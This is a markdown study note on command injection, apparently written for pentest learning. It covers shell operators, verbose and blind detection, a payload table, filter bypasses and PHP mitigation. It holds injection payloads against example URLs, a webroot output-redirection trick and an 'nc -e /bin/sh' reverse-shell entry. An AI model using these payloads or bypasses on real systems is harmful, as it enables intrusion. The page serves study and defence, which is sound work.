## Overview
Command Injection is the abuse of application functionality to **execute system-level commands** on the underlying OS. It occurs when unsanitised input is passed to functions that invoke system commands.

- Also referred to as **Remote Code Execution (RCE)**.
- Code is executed with the **same privileges** as the running application.
- Allows attackers to:
    - Run system commands (e.g., `whoami`, `ls`, `cat`)
    - Read sensitive files
    - Potentially escalate privileges or pivot
### Goal of the Attacker

Gain **execution on the target system**, possibly leading to **full system compromise**.
###### [Cheat Sheet](https://github.com/payloadbox/command-injection-payload-list)
---
## 🧪 Discovery

### How to Discover Command Injection

Look for inputs that interact with the system:
- Forms or URLs that query the OS (e.g., ping, search, file lookups).
- Unexpected results when using special shell characters like `;`, `&&`, `|`.    
### 📌Indicators

- Output of system commands in the web page (verbose).
- Delayed responses (blind).
- Logs or unexpected files created on the system.
- Web errors showing command output or failures.

---
## 🚨Exploitation Techniques

### Execution Operators (Linux/Windows Shell)

- `;` → Executes the next command.
- `&&` → Executes next only if previous succeeds.
- `|` → Pipes output.
- `||` → Executes next only if previous fails.

### 🔎 Verbose Command Injection

Application **returns output** of the command.

> Example:  
> `http://target.com/search?query=abc;whoami`  
> → Output shows `www-data` or other username

### 👀 Blind Command Injection

Application **doesn’t return output**, but command still executes.
#### 🧪 Detection Methods
- **Delay-based testing**:  
    Use commands like `ping`, `sleep`, or `timeout`
        
    > `127.0.0.1; ping -c 5 127.0.0.1`  
    > `127.0.0.1 && sleep 5`
    
- **File-based output redirection**:
    > `; whoami > /var/www/html/output.txt`  
    > Then access `output.txt` via browser

### 🧰 Useful Payloads

[Cheat Sheet](https://github.com/payloadbox/command-injection-payload-list)
#### 🐧 Linux

| Payload               | Purpose                                    |
| --------------------- | ------------------------------------------ |
| `whoami`              | Identify running user                      |
| `ls`                  | List current directory                     |
| `ping -c 4 127.0.0.1` | Cause delay (detect blind injection)       |
| `sleep 5`             | Alternative delay (when `ping` is blocked) |
| `nc -e /bin/sh`       | Reverse shell (if `nc` is available)       |

#### 🪟 Windows

|Payload|Purpose|
|---|---|
|`whoami`|Identify running user|
|`dir`|List directory contents|
|`ping -n 4 127.0.0.1`|Delay (Windows equivalent)|
|`timeout /T 5`|Another delay method|
### Payload Example (curl)

```bash
curl "http://vulnerable.app/process.php?search=Beatles;whoami"
```

---

## 🛡️ Mitigation

### Dangerous Functions (PHP examples)
- `exec()`
- `system()`
- `passthru()`
- `shell_exec()`
> These execute shell commands directly and should be avoided or tightly controlled.

### Input Sanitisation
- Restrict input types (e.g., numeric only)
- Reject or encode special characters (`&`, `|`, `;`, etc.)
- Use whitelisting rather than blacklisting
- Validate input using functions like `filter_input()` in PHP

**Example**:
```php
$input = filter_input(INPUT_GET, "id", FILTER_VALIDATE_INT);
if ($input === false) {
    echo "Invalid input.";
    exit;
}
```

---

### 🧠 Filter Bypasses

- Use **hex-encoded characters** instead of blocked symbol    
- URL encode shell operators (`%3B` for `;`, `%26` for `&`)
- Use alternate syntax (e.g., base64, backticks, `$()`)

---
## 🧼 Remediation Summary

- Avoid executing system commands when possible.
- Use **language-safe functions** (e.g., DB queries instead of shell tools).
- Validate all user input rigorously.
- Sanitize using strict patterns.    
- Monitor and log unexpected command activity.

---